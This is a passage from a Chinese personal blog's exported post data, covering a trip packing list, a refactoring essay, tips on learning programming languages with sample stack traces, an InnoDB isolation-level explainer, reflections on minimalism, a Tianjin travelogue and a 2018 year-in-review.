下面👇是去之前简单做的攻略： 要带的东西： 防晒霜、太阳镜、帽子、雨伞 防蚊虫叮咬的、创可贴、风油精、快客 野餐垫、食物、水果、红牛 身份证！！！！！ 手机、充电宝、 纸质现金 昼夜温差大（28 - 15度）带一件春秋外套 穿户外登山、运动鞋！！！ 摄影装备（选填） 玩点： 看日出 柳树沟（50元） 情人谷（免费） 草原娱乐场（滑草？？、射箭、CS、骑马） 烤串 草原天路 路线图：(需要的可以找我要～)","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"从小重构说起","slug":"关于技术/系统经验/从小重构说起","date":"2019-06-26T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2019/06/26/1.html","link":"","permalink":"https://noogel.xyz/2019/06/26/1.html","excerpt":"","text":"首先要说的是重构最基本的定义：重构是在不敢编软件可观察行为的前提下改善其内部结构。 每一个开发人员肯定都经历过『坏代码』的味道。在一个古老又庞大的项目中，这里面一些函数的作用和逻辑变的很难理解，没有人了解这里的所有 case，加上没有足够的注释，之前开发的人员离职等诸多因素，可维护性非常低，谁都不愿意碰，这时候再改动一个需求，会很容易引入一些 bug。当你遇到上面的这些情况时那么时候要把这摊『臭水坑』清理一番了。 我们知道要做重构这件事了，那么『工欲善其事必先利其器』，重构也是有诸多手段的，有许多被前人验证过的重构手法来帮助我们改善项目代码的健康状况。接下来讲讲一些小的也是简单实现的重构方式。 小重构重复的代码重复代码的抽象有几种方式，一种是将重复的代码或者相似的代码，可以提取到一个扩展函数中，然后在多个地方调用；或者将多个相似类中的相同代码抽象到父类中，子类调用，但是按照组合优于继承的设计方式，不建议这样做；再有是对相似流程代码抽象出模板方法，子类实现差异化逻辑。 过长的函数在计算机领域有这样一句名言：『计算机科学相信所有问题都可以通过添加一个间接层来解决』。如果我们没有良好的系统设计经验和深刻理解面向对象思想（业务系统主流的编程思想），就很容按照过程式的思想去写代码，就会出现职责庞大的函数或类，有着超多的分支判断逻辑，各种补丁代码块。这里一部分是系统设计的问题，另一方面没有很好的拆分职责。一个很好的办法就是将分支中的代码块抽离成小函数，把大类拆分成职责较为单一的小类。再有让小函数容易理解的关键是一个好名字（关于起名字这块可以单独说说）；再有大函数中的临时变量可能阻碍你的拆分，可以把这些临时变量通过查询的方式获取，既提高了可读性又能共享给其它地方用。 过大的类过大的类就像过长的函数，冗杂且难以理解。我们通俗的说这个类的职责太重了，导致里面又很多的实例变量。改造的办法是将多个实例变量分组，然后拆分不同的类去处理，这样来拆分出一些单一职责类。再有就是可以确定类的使用方式，提炼出来接口帮助理解这个类。 过长的参数列表过长的参数列表可能是这样产生，最初定义接口只有两个参数，那么随着业务扩展，这个函数产生的职责越来越大，随之参数越加越多。这种的解决方案是搞一个参数对象，将原先的参数都保存到参数对象实例中，然后传递这个实例到函数中处理。 然后呢我把这写最基本的风险小的方式叫做小重构，可以让我们的代码变得稍微好一些。其实你在做小重构的过程中可以慢慢形成对于这个系统业务流程的理解，以及对于系统设计（大）重构方向上的思路。那么什么时候或者什么时机就要开始重构？ 如果让我接需求改系统一个部分的代码，做完如果再次需求改动不是很容易改的时候，基于事不过三的原则，我会在需求中做一些重构来弥补设计上的缺陷；再有就是修复 bug 的时候，如果不是很好修复，我也是要先进行适当的重构的再去解决的；或者我们集中进行 codereview 的时候提出来需要进行的重构时。 一个好的项目是需要有一个好的设计基础，因为我们不能只想着今天做什么，还要想明天可能会做什么，只做好今天，而明天到来发现无法做到，那么也是失败的，想的多了就会出现过度设计，也是包袱。所以写好代码是一件挺难的事情，写之前多思考一下。今天先写这么多～","categories":[],"tags":[{"name":"重构","slug":"重构","permalink":"https://noogel.xyz/tags/%E9%87%8D%E6%9E%84/"}]},{"title":"如何高效学习一门编程语言","slug":"关于技术/程序语言/如何高效学习一门编程语言","date":"2019-05-26T00:00:00.000Z","updated":"2025-07-23T10:39:51.773Z","comments":true,"path":"2019/05/26/1.html","link":"","permalink":"https://noogel.xyz/2019/05/26/1.html","excerpt":"","text":"首先这篇文章是建立在有一些编程基础之上来展开的，做为一种效率学习编程语言的自我总结输出。把编程语言当做一个工具，而这些不同种类的工具有很多的共通之处，抓住其中的关键之处可以大大提升学习效率，也是一篇自我总结的学习方法论，里面有的方法可能不适合我，但也会讲讲。如果要学习一门编程语言，先要问一下为什么要学？学会了能做什么？要达到什么样的目标？只有把这些问题想清楚了再去做，不然稀里糊涂不知所以，很可能半途而废。想明白了就要坚持去做，不要再东望望西看看，想、做、坚持三位一体是学到的基本三要素。 学习途径分析网上的学习资料纷繁复杂，各种培训课程满网都有，那么大致分为以下几种吧： 总结来说学习路径是这样的。 入门：适合通过看视频和培训来实现，然后通过搜索引擎和博客文章论坛协助解决遇到的各种问题。 提高：通过看书和大佬的博客文章交流论坛等来加深理解。 实践：实践也是提高的一种方式，可以通过学习别人项目来仿写实践。 适合学习或交流的地方，Stack Overflow、博客园、简书、GitHub、官方论坛等等。关于搜索引擎，入门用百度就可以了，提高和实践建议用谷歌。 指定计划这个也挺关键的，我就没有做好，也不太好定。 查问题的办法学习过程中很关键的一点就是遇到问题如何解决问题，解决问题的速度和方法很大程度上决定我们后期学习的进度和自信心，那么我总结了几条比较关键的要素说明。 学会如何看异常信息不论写 demo 还是实际项目开发中，肯定会遇到一堆异常情况，然后控制台打印一堆杂乱信息，首先要做的是理清楚其中的信息结构，其实就是日志啦，大致分为以下几种： DEBUG：一般在开发调试期间开启，可以比较清楚的了解程序在运行过程中的各种状态和传参等。 INFO：正常运行日志信息，当程序访问量很大的情况下很多，会收集到日志系统。 WARN：对于程序可能出现的潜在问题的地方记录信息，或者不再支持的方法或库等。 ERROR：对于程序运行中的非预期异常访问、状态、请求需要记录错误信息和错误状态。 TRACE：这个在不同语言表的可能不同，主要是概括为带有调用堆栈信息的异常日志。 那么在测试过程中为了快速定位问题，还是要打印 TRACE 级别的异常日志，那么异常信息如何看呢？ Python 的异常信息示例 12345678910111213xyz-macdeMacBook-Pro:dev-demo xyz$ python mixin_demo.py Init people.People can eat!People can drink!People can Traceback (most recent call last): File &quot;mixin_demo.py&quot;, line 44, in &lt;module&gt; people = People() File &quot;mixin_demo.py&quot;, line 39, in __init__ print &quot;People can &quot;, self.sleep() File &quot;mixin_demo.py&quot;, line 30, in sleep raise NotImplementedError(u&quot;can&#x27;t sleep.&quot;)NotImplementedError: can&#x27;t sleep. 在执行 Python 脚本的时候执行异常报错，Traceback 是我们要看的异常堆栈信息，自顶向下从 &quot;mixin_demo.py 的 44 行开始执行，执行到 mixin_demo.py 第 30 行报错，异常类型 NotImplementedError，异常内容为 can&#39;t sleep.。也就说我们看到报错信息后，然后可以看到对应报错的位置以及调用链，方便快速定位到问题。 Java 的异常结构展示顺序有点不同，它的信息最底部是调用入口，然后向上一直到报错点，还有报错信息也在上面。这里只是一个简单的示例，通常 Java 的异常堆栈信息很长，调用链很深，这就需要有一定的经验来判断问题实际产生的原因。 12345678910objc[20307]: Class JavaLaunchHelper is implemented in both /Library/Java/JavaVirtualMachines/jdk1.8.0_131.jdk/Contents/Home/bin/java (0x1077344c0) and /Library/Java/JavaVirtualMachines/jdk1.8.0_131.jdk/Contents/Home/jre/lib/libinstrument.dylib (0x10874d4e0). One of the two will be used. Which one is undefined.Exception in thread &quot;main&quot; org.springframework.beans.factory.NoSuchBeanDefinitionException: No bean named &#x27;teacher2&#x27; available at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanDefinition(DefaultListableBeanFactory.java:775) at org.springframework.beans.factory.support.AbstractBeanFactory.getMergedLocalBeanDefinition(AbstractBeanFactory.java:1221) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:294) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.CglibSubclassingInstantiationStrategy$LookupOverrideMethodInterceptor.intercept(CglibSubclassingInstantiationStrategy.java:290) at com.noogel.xyz.lookup.GetBeanTest$$EnhancerBySpringCGLIB$$e79f57a6.getBean(&lt;generated&gt;) at com.noogel.xyz.lookup.GetBeanTest.showMe(GetBeanTest.java:5) at LookupTestMain.main(LookupTestMain.java:9) 使用IDE断点调试 IDE 可以帮我们做很多事，大大提高了我们的开发效率，那么如何用好这样一个工具也是很关键的，这里说一下利用 IDE 进行 debug 调试。 通过上图我们可以看出 IDE 的调试功能很丰富，如果用好对于提高学习编程效率很有帮助。 查问题打日志在 Python 中有一个查问题很好的利器 iPython，可以很方便的直接传参执行函数，对于线上问题，这样虽然很方便但是不可取。像 Java8 这样版本下的语言又没有很好用的一个工具，那么可以通过打日志的方式来操作，需要对可能的问题点分析然后增加日志辅助判断，打日志是一个很合适的查线上问题的方式。 向有经验的人请教老师傅一出手就知有没有，如果遇到问题没有思路或者自己憋住了，需要及时向有经验的人请教，才是一个正确的选择。 了解框架的运行机制俗话说『打铁还需自身硬』，遇到了问题总不能一直向别人请教吧，还是要自己去搞定的，上面的介绍的方法搞不定怎么办，那就要平时花心思在使用的框架上学习了，因为你不可能直接裸写代码的，一些轮子直接搬过来用固然高效，但是不懂构造轮子还是用不好的，容易出问题，所以要平时多去积累了。 以上讲的都是一些可以提高学习效率的方法。先写这些，后续想到新的再继续更新。 实践一个项目一般视频和图书的最后一部分都会有初级的实践项目，可以用来综合练习一下所学到的知识。可以看完再自己提需求自己实现一遍。 再有就是 GitHub 上有很多，不过要好好找找合适，可以拿来练手，最好是找一些多 star 的项目，对于技术提升很有帮助，发现问题还可以提 issue 交流，然后提 PR 解决。 另外一个就是某某公司意外泄漏或者开源的项目源码，这些都是经历生产环境反复验证的代码，具有很高的参考性。 举个例子就是在 Java 中 spring MVC 是一个很著名的项目，那么学习它，有的人就手敲 spring 项目，边学习边实现其中关键的代码。GitHub 地址：https://github.com/code4craft/tiny-spring 了解语言的技术栈学习一门编程语言肯定是用来解决实际问题或找一份工作的，那么你要知道并不仅仅是学习这门编程语言，而是整个技术栈。了解一个语言的技术栈可以去招聘网站上看，一般都会写至少需要精通一门编程语言，熟练使用 MySQL 解决并优化问题，熟练使用并了解各种 MQ 原理等等。那么这些都是需要去了解的，起初学习可以为了用而用的去实践一个更完整的需求。 比如说我需要了解公司的微服务架构，那么我需要看它都用了哪些技术栈，然后自己再手敲一些项目，并且 docker 化，自动注册服务发现来管理多个 RPC 服务等等。。。 总之，一个是多看多实践多思考，然后就是多交流，闭门造车是不行的。 了解语言的运行机制语言的内存模型？语言的并发模型？语言的垃圾回收机制？","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"InnoDB中的事务隔离级别与锁","slug":"关于技术/中间件/InnoDB中的事务隔离级别与锁","date":"2019-05-22T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2019/05/22/1.html","link":"","permalink":"https://noogel.xyz/2019/05/22/1.html","excerpt":"","text":"基本概念一个事务在进行数据变更时对另一个事务产生的可见性影响描述，表达为 脏读、幻读、不可重复读三个概念。下面具体解释下对应概念。 脏读：当前事务能够读取其它事务未提交的数据。 幻读：当前事务中在前后两次相同查询中读取的数据不一致，原因在第一次查询后第二次查询前提交了数据产生的。（侧重于插入了新的数据） 不可重复读：当前事务中查询相同的范围数据，同一数据的内容发生了变化。（侧重于数据的更新）基于这三个现象描述，主要因为 MySQL 设置的隔离级别不同导致的。 ACID特性 原子性(Atomicity)，一个事务中的所有操作要么全部成功，要么全部失败，不能只成功一部分。 一致性(Consistency)，从一个一致性状态到另一个一致性状态的转换。（一致性和隔离性保证了数据的一致性） 隔离性(Isolation)，一个事务在提交之前对其它事务是不可见的。 持久性(Durability)，一个事务一旦被提交就会永久的保存到数据库中。 InnoDB中的事务隔离级别 未提交读(Read Uncommitted)，允许脏读，也就是可能读取到其他会话中未提交事务修改的数据。 已提交读(Read Committed)，只能读取到已经提交的数据。Oracle等多数数据库默认都是该级别。 可重复读(Repeated Read)，在同一个事务内的查询都是事务开始时刻一致的，InnoDB默认级别。在SQL标准中，该隔离级别消除了不可重复读，但是还存在幻读。 串行化(Serializable)，完全串行化的读，每次读都需要获得表级共享锁，读写相互都会阻塞。 隔离级别 脏读（Dirty Read） 不可重复读（NonRepeatable Read） 幻读（Phantom Read） 未提交读（Read uncommitted） 可能 可能 可能 已提交读（Read committed） 不可能 可能 可能 可重复读（Repeatable read） 不可能 不可能 可能 可串行化（Serializable ） 不可能 不可能 不可能 1SELECT @@tx_isolation; 查询 InnoDB 的默认隔离级别是 RR，按照四种隔离级别的关系来看是会出现幻读情况，但实际上 InnoDB 引擎下的两次查询是一致的，那么它是帮我们解决幻读了吗？ 1234567891011//设置read uncommitted级别：set session transaction isolation level read uncommitted;//设置read committed级别：set session transaction isolation level read committed;//设置repeatable read级别：set session transaction isolation level repeatable read;//设置serializable级别：set session transaction isolation level serializable; MySQL是如何解决幻读的？ 在可重复读隔离级别下,普通的查询是快照读,是不会看到别的事务插入的数据的。因此,幻读在 “ 当前读 ” 下才会出现。 update 语句的修改结果,被之后的 select 语句用 “ 当前读 ” 看到,不能称为幻读。幻读仅专指 “ 新插入的行 ” 。 产生幻读的原因是,行锁只能锁住行,但是新插入记录这个动作,要更新的是记录之间的 “ 间隙 ” 。因此,为了解决幻读问题, InnoDB 只好引入新的锁,也就是间隙锁 (Gap Lock) 。间隙锁和行锁合称 next-key lock ,每个 next-key lock 是前开后闭区间。next-key lock 可能会导致同样的语句锁住更大的范围,这其实是影响了并发度的，在 RR 隔离级别下，两个是事务同时锁住一个不存在的值，之后进行插入操作会引发死锁，因为间隙锁之间并不会冲突。如果设置成 RC 隔离级别的话间隙锁就不存在了，同时需要解决对应的数据和日志不一致问题，需要把 binlog 格式设置为 row 。 参考： https://www.cnblogs.com/likui360/p/9632641.htmlhttps://en.wikipedia.org/wiki/Isolation_(database_systems)#Phantom_reads","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://noogel.xyz/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"我的极简主义尝试","slug":"关于生活/我的极简主义尝试","date":"2019-05-19T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2019/05/19/1.html","link":"","permalink":"https://noogel.xyz/2019/05/19/1.html","excerpt":"","text":"夏天来了，大半夜热的睡不着，最近看过一本书《极简主义》，罗列一下其中的观点，以及作用到生活中的尝试。 首先来引述原文介绍下什么是极简主义： 极简主义是一个工具，我们用它来获得人生的满足感。极简主义中没有规则。确切的说，极简主义只是去除生活中那些无关紧要的事物，从而使我们能够专注于最重要的东西——而它们事实上根本就不是实物。 这并不是它的定义，而是说明了从极简主义带给我们什么，让我们从杂乱的生活中抽离出来，让我们舍弃对于我们不那么重要却又不想割舍的人际关系或事物，专注于重要的事情中去。读这本书的起因是前一段时间对于工作和生活感到很沉重，工作一天带着疲惫身体回家后，面对堆满杂物的宿舍，心情更加烦躁，每天纷繁不断的微信消息偷走了大量的时间。每天都很忙，却又觉得并没做什么事情，睡觉的时间也越来越少。 当我意识到现在的问题，恰好在豆瓣看到这样一本书，下载下来读了一遍，对于书中的部分观点还是比较认可的，便有意识的改变自己的生活方式。这里作出改变只是在生活上，对于工作还是那样，甚至我认为工作是反极简主义的，就像书中的作者是辞去工作开始的极简主义实践。其中有很多讨论我并没有太在意，也是不适合我当下去作出改变，下面只是按照一条实践过的线去聊。 首先，是什么让我们感到不够快乐，让我们感到压力呢？作者确定了一个叫做『锚』的概念，代指我们想要的得到的大房子、高薪、物质财产、公司奖励等，这些欲望占据着我们，给我们带来压力。试想一下如果我们已经拥有或者舍弃掉这些，也许会轻松很多，可以有更多的时间精力专注于我们喜欢的事情上，让人生过得更有意义？好像我现在也无法做到舍弃。如果这个⚓️给你带来太多负担，那你是要舍弃了，而这里我所能做的不是上面那些，下面慢慢说。 首先我们要使人生有意义的五大价值明确： 健康 人际关系 热情 成长 奉献 这本书后面的章节也是在围绕着五个主题来开展说明的。这本书有个特点就是并不想书名那样极简，而是在不断赘述一些观点，以加强这些观点在读者心中的印象吧。 作出改变，如果你只是一味在想而没有实际付出行动的话并没有任何作用。首先是必须要作出改变，改变永远不会太迟，你需要的只是在知道该怎么做了之后付诸行动。这点很重要，所以作者也是提前说明。这里推荐去看拖延症相关的知识。 下决心总是困难的。而拖延却很简单——至少拖延一时很简单。但拖延得不到任何回报。 打包派对，打包你大量的闲置物品，保留生活中常用的，然后扔掉、转卖或捐赠。对于闲置物品不仅占用了你的空间，还浪费你的精力，平时你也想不起来用它，然后又要找半天，在生活如此便利的今天，你可以舍弃很多无用的东西了。还有注意不要囤货，日用品很容易买到，你就把楼下的便利店当做你的免费仓库好了。东西要少而精。推荐看一下《怦然心动的人生整理魔法》、《断舍离》还有日剧《我的家里空无一物》。看完书的当周我便清理出了几大袋子暗藏在屋里角落的无用物品，实际上在之前看书的时候就有意识的清理丢弃无用的东西，只是后来没做好，看来要周期性清理一番。 健康，这个老生常谈，却总被人忽视，没有健康，你连生活中最简单快乐都无法享受。这里我一直做不好的就是没能去改变熬夜的习惯。健康的从广义上来讲有以下几种：情绪健康、心理健康、精神健康、财务健康、身体健康等。这里只针对身体健康来讲，分为两个方面，饮食和锻炼。饮食上并没有去尝试改变，因为自己本身很瘦。而锻炼作出了一些，在这之前总是说要去健身房健身，却总是懒的去，读完这本书后努力去作出改变，从跑步开始，因为我觉得跑步是最容易开始的锻炼，现代科技带给人们很多的便利性，借着小米手环的帮助开始了每周三次的夜跑，精神状态也慢慢好转。另外说一句是跑步要是一件技术活，推荐看一下《运动改造大脑》、《跑步圣经》这两本书。平时多看看书还是有好处的，当你尝试作出改变的时候也是能知道如果改变。 讽刺的是，锻炼实际上给了你更多时间，而不是把时间夺走了。它不光能延长寿命，对我个人而言，它还让我跟我最好的朋友建立了更紧密的联系。当我一个人锻炼时，它又给了我独处的时间，留给自己的时间，而我们都知道这是很重要的。锻炼是一种意想不到的帮你重获时间的方式。 人际关系，你的人际关系有你的亲人、朋友、同事、配偶、恋人、室友等。人际关系处理这块是弱项，需要认真🤔一下。 建立关系的三种办法： 寻找超棒的新人际关系； 改造你现有的人际关系； 改变你自己。 必须要牢记的是：你的人际关系在你往后的人生中并不是固定不变的。随着年龄的增长，会有不同的人走入或走出你的生活，而他们与你的关系的重要程度也会改变。许多十年前与你关系紧密的人现在已经不再亲密了，对吧？同样，你未来的人际关系也会继续变化、成长。因此，在这个过程中积极行动就很重要。你主动选择自己的人际关系，而关于前两档人际关系的调整，往往要作出很艰难的抉择。你唯一能改变的人是你自己。当你以身作则时，与你走得最近的人，往往也会跟着效仿。 断掉网络，这点对我的改变应该说是关键性的。每天下班回家都会有家人和朋友发来各种微信消息，填充了我整个晚上的时间，使我并没有一段固定且连续的个人时间了，也就导致我对于当下缺少反思，活在网络的世界中。还有各种 APP 新闻推送，一刷就停不下来的短视频等，我们的时间被大量的占据，这也是痛苦和拖延的关键，也是一个很重要的⚓️。然后我做了一些改变。 开始清理📱中那些功能重复的 APP，比如获取热点新闻微信足够了，我对时效性又没有那么高。 各种短视频 APP，这些起初我觉得有学到东西才装的，但是却背离了初衷，成了娱乐工具，然后果断卸掉。 还有各种能用微信小程序替代的常用 APP 基本都卸掉了。 有些保留了，QQ 被我用 Tim 替代，有些不得不看的群内容我也是订好提醒，每周看一周的内容。无关紧要的推送都被我禁掉了。 还有最重要的一点是每天非特殊情况下执行断舍离计划，晚上 10 点到 11 点断网一小时，感觉这个世界突然安静了起来，可以专心想和做一些事了。 这里多说一句，网络依赖确实像一种上瘾的症状，而且现在绝大多数人都是这样子，这个还是要从自身开始尝试摆脱这种依赖，呼吁身边的人同样去改变，我们的生活应该会有很大的改变。 认知，认知是我们最宝贵的自由。前几年我们一直在讲认知升级，确实，这就是一种让我们获得自由的方法。这里推荐去看《见识》这本书，不再多说。 回到最初，极简主义是一个工具，这个工具使我们摆脱那些闲杂冗余，从而更容易过上有意义的生活，这个工具使充斥着无尽装饰、看起来错综复杂的世界变得更简单、更容易、更真实。 第二天早起接的🐰主子，来自主子的凝视 qwq…","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"天津两日游","slug":"关于生活/寻人不遇/天津两日游","date":"2019-04-07T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2019/04/07/1.html","link":"","permalink":"https://noogel.xyz/2019/04/07/1.html","excerpt":"","text":"为什么是天津，一个是离得近往返方便，另一个是没有去玩过，想去好好转转，两天时间能玩个大概吧。 天津卫由来去之前，对于天津的了解只知道是个直辖市，书本上的了解早已忘干净了。去了才知道天津又称天津卫，其中的『津』意为渡口，『天』意为天子，是明成祖朱棣赐的名，为『天子的渡口』含义。『卫』是明朝的军事建制，当时天津设有天津卫、天津左卫、天津右卫，是这个称呼的由来。 解放桥、世纪钟解放桥和旁边的世纪钟👇 出了城际站做了一站天津地铁，也是因为不熟，绕了个小弯，出了地铁站就看到了解放桥，解放桥对面是世纪钟。解放桥旧城万国桥，始建于 1927 年，是天津标志性建筑之一，看历史挺波折的，和世纪钟挨着，有兴趣可以去了解一下。 九国租界的事到了天津才知道战乱时期曾设立过九国租界，对天津的建筑风貌产生很大影响，而天津政府对于这些建筑风貌一定程度上进行了保留，所以在天津经常看到一个外国风貌建筑的背影是现代高楼。 意式风情街到了天津一定要去的地方，保留了大量的意式风情建筑和名人故居，里面有一个免费的天津历史介绍展馆，可以了解一下天津的历史变革和人文风貌。然后是里面的几个景观建筑，但丁广场和马可波罗广场。再有就是逛了一下梁启超故居，里面介绍了梁启超的生平和贡献。其中的意大利兵营应该是某个部门的办公单位，只是在外面观望了一下。整个意式风情区不需要门票，可以骑着单车在里面随意闲逛，时不时会看到一些名人故居，意大利风情建筑在这里融为一体，颇有一些浪漫氛围，拍婚纱照可以来这里。 马可波罗广场👇 梁启超故居👇 意大利兵营👇 1919出发前一天晚上看着《爱因斯坦传》入睡的，正好看到了，1919 年发生了一件事，使得几年前爱因斯坦在广义相对论中的预测得到了证实，从此爱因斯坦被推上神坛，想了解可以去看一下。同年梁启超参加巴黎和会，然后巴黎和会上中国外交的失败引发了五四爱国运动。发现今年恰好是这两个事件一百周年之际。 天主堂的故事接下来的行程是计划去古文化街，在旁边看到一个天主堂，正赶上在看西方哲学故事，便进去听修女讲了一段耶稣受难的故事。 古文化街古文化街也是网上推荐的打卡地，是一个天津著名小吃街，有着很浓厚的商业气息，就像北京王府井的小吃街，不约而同的都听到过是本地人基本不去的小吃街。在这里我觉得去看一下就行了，个人觉得东西不咋地，吃的也很难吃。 金汤桥的历史 金汤桥和解放桥一样也是架在海河之上的大型铁桥之一。建于清光绪年间，1949 年在平津战役中，解放军分为东西两个突击团对天津守敌发起总攻，在金汤桥胜利会师，所以称为了解放天津的标志性建筑。 站在金汤桥上拍海河👇 天津之眼 我想每个来过天津的人都会推荐去做一下天津之眼，它是一座跨河建设的摩天轮，推荐晚上去做可以欣赏整个天津的夜景，排队一个半小时，坐摩天轮半小时一圈，适合情侣去。做完摩天轮可以去附近的码头做轮渡欣赏海河夜景，可惜的是人家关门早，没赶上。 海河夜景👇 瓷房子 瓷房子原来是一个座法式洋楼，后来才经人设计贴满了瓷片。里面有讲解主要说的是瓷房子的设计理念和寓意，也是为了弘扬中华文化。初次去看整个瓷房子很惊艳梦幻，因为对瓷器不懂，也只是作为一个门外汉草草欣赏了一番，其实里面有很多细节和故事可讲，也不知从何了解。 五大道对于五大道的游览仅限于做了一趟观光马车，听了一遍讲解。看里面的景色和建筑很有异国风情，差不多也快百年历史了吧，春天适合情侣们来拍照。里面的建筑大部分都被一些公司租下来用来办公了。 西开教堂西开教堂是天津最大的罗马式建筑，从外面看上去气势恢弘，说道这里，其实也想去通过天津了解各国的建筑风貌，但是并没有从当地的讲解中了解到，也是一个遗憾吧。对于建筑的讲解大部分还是偏向于外观独特地，比如瓷房子之类的，这样也许更适合游客的接受。 高达宏伟的西开教堂👇 劝业场买买买，类似于北京的西单商业街，各种一二线衣饰品牌。 交通上面所说的几个景点基本都挨着很近，所以整个游玩并没有做地铁，而是骑地随处可见的电助力车，可以走走停停自由把握节奏，当然也可以做公交。总之交通是很方便，比起偌大的北京城，可以很快的在景点之间切换。 最初规划要去的地方👇 吃关于吃这可就难到我了，古文化街的小吃真心不建议了，景点的东西贵倒无所谓，主要是不好吃。地道的小吃又找不到，所以也无法推荐，据说天津人特别重早餐，越小摊做的小吃越地道，可以去试一下，注意要避开景点附近。 这次的天津游玩，更偏重于了解城市文化和历史吧，吃上没怎么下功夫，玩上适合两个人春暖花开来拍照。单单了解一个城市两天肯定是不够的，这次也只是把课本上的历史一部分变成了身边的故事，至于剩下的故事，不知何时再去了解了。 最后附上一张🤳","categories":[],"tags":[{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"关于成长与失去的 2018 年","slug":"关于生活/年/关于成长与伤痛的2018年","date":"2019-03-23T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2019/03/23/1.html","link":"","permalink":"https://noogel.xyz/2019/03/23/1.html","excerpt":"","text":"今日寻得一个好地方，可以静下心来好好回忆下去年的经历与成长。在这一年中遇见了一个不错的领导同时经历了部门比较大的人事变动；谈了女朋友又分手了，改变了我某些观念和生活习惯；首付了一套老家的房子，漂泊的心得以暂时的安稳；认真读完吴军博士的《见识》、《具体生活》两本书，对于我的认知提升帮助很大。 工作的成长 第一次遇见这个领导，并没有特别的印象，只是他特别女性化的名字很容易让没见过他的人误解。后面慢慢工作中会发现带着之前学长的身影，是那种之前提到过的为了技术而做技术的人，会带着一种求知与好知的心态在工作与生活，在目前这样一家公司部门中很难再发现第二个这样的人，他的强大之处还有就是对于人的影响。我认为知识与观念之类的第一我们要做到的是输入，需要我们去主动学习；第二便是内化，如何将所看所听转化为自身的感悟，需要我们去多思考；第三便是输出，将我们自身的认知与见解传达给别人，从而影响和改变别人。所以能做到第三点的人真的是很厉害，当然这里所说影响一定要是积极的一面。他的影响力在周边同事相较是要高出很多。而我自评来说，第一和第二尚可，第三却是几乎没有了，所以表达力这一层也是我很缺失的一部分，再有就是过于习惯性做事，缺乏足够的思考。这里说的更多还是在于工作和技术方面。 失去的开始 失去了什么？时间还是人。有个深刻的体会就是失去便是成长的过程，想起电视剧《男人帮》中的一句颇有哲理性的一句话『有一些东西我们盼不到，有一些事情我们回不去。但每次想到你带给我的变化，我就充满感激。我想起你，就是想到现在变得更好的自己，这样的自己是你带给我的。』，你身边的恋人或每一个同学朋友，你们互相交谈一起玩耍，后来你们不再联系，彼此陌生，或许有一天你会突然回想起他（她）的一句话，你觉得有道理去改变了。其实在这些亲密关系中，一个很重要的角色就是你的恋人，因为熟悉，便可以心安理得地对自己的缺点置之不理，很容易忽略对方的吐槽，直到有一天过不下去了，你便开始察觉开始改变。也或者说，其实你一直在改变中，对方也一直在改变中，只不过之间有道无法逾越的鸿沟，或是没有留给时间足够的耐心。 改变的过程大部分情况下是很不舒服的，时常会抱怨，会拒绝，但有时如果你能从更长的时间范围去思考你现在所处的环境下，也许就会变得从容很多，我说的时间长度超越生命。很多事物我们不能掌控，比如时间、生命、人与人之间的关系，唯一能掌控的便是我们的心灵，所以外在的事物变得不那么紧要。 最近在看和听一些关于哲学方面的书，其中有些哲学学派的理念与我现在生活的状态有些契合，并且能带来新的观念认知，接下来还需要一个比较长时间的内化过程，过段时间想整理一篇关于哲学感悟的文章。 习惯与认知 去年带给我认知升级的一本书便是《见识》，有很多更高视角的观点与态度认识；另外便是我的领导，从他身上看到了求知好知的习惯；再有便是看到了前女友的行胜于言。每一个人每一本书都有我们值得学习与借鉴的地方。 保持一颗好奇心很重要，不知道从哪里有人提到过康德的《纯粹理性批判》这本经典哲学书，又听说过王思聪大学读的是哲学这种基础学科，加上身边很多人对于哲学的态度，便想一探究竟，咨询过朋友后便从个《苏菲的世界》这本西方哲学入门书开始了，加之樊登读书会中听了很多地关于东方哲学书，有些感悟，又有些混乱，这个过程又带来了很多快乐，有时间真的要好好整理一番。 可能因为我们领导是个数学谜，所以或多或少都会受到他的一些影响，印象深刻的便是他曾问我『如何证明存在 0 这个数？』这种奇怪的问题，还有要我们新系统都是以数学家的名字命名的，这些事情也改变了我对于数学的一些看法，发现数学之美，但是却难以实践其中真髓，这里推荐《费马大定理》、《数学之美》这两本书，你会发现你之前学的只是数学，数学之外的延伸才是真正的数学之道。 还有一点必须要的说的便是『知行合一』，是王阳明心学中的主要理念。我们经常说『知易行难』，说的是知道很容易但是做起来很难，其实按照王阳明的观点来说，知行必合一，你只有知道了才会去做，如果你不去做你肯定是没有真正知道。在这里前女友践行的是『行胜于言』，她的执行力与沟通能力都要高出周围人很多，也是我所见到过的。所以我最近养成的一个习惯是，周末不要宅在家里，多出去走走，看看不同的人，学习接受新的观念与知识，扩展自己不熟悉的领域。忽然发现『读万卷书，行万里路。』与『知行合一』有种异曲同工之妙。 在路上 今天又是一个周六，没有计划出去玩，偷了一个懒觉，下午便寻得一个安静的小地方，写完这篇文章，也是对去年和最近一段时间的总结与感悟。 